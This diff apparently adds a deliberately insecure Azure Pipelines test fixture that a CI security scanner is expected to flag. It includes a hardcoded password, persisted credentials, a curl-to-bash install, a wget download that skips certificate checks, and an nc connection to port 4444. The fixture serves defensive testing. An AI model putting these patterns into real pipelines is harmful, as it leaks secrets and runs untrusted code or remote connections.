@@ -1,0 +1,20 @@
+# path: azure-pipelines.yml
+# expect: TG-AZP-001, TG-AZP-002, TG-AZP-003, TG-AZP-004, TG-AZP-005, TG-AZP-006, TG-AZP-007, TG-AZP-008
+variables:
+  - name: SERVICE_PASSWORD
+    value: hunter2hunter2
+resources:
+  containers:
+    - container: builder
+      image: ubuntu:22.04
+jobs:
+  - job: Build
+    container: node:latest
+    steps:
+      - checkout: self
+        persistCredentials: true
+      - bash: |
+          curl -fsSL https://example.com/install.sh | bash
+          echo "##vso[task.setvariable variable=key;issecret=true]value"
+      - script: wget --no-check-certificate https://example.com/x
+      - powershell: nc 10.1.1.1 4444
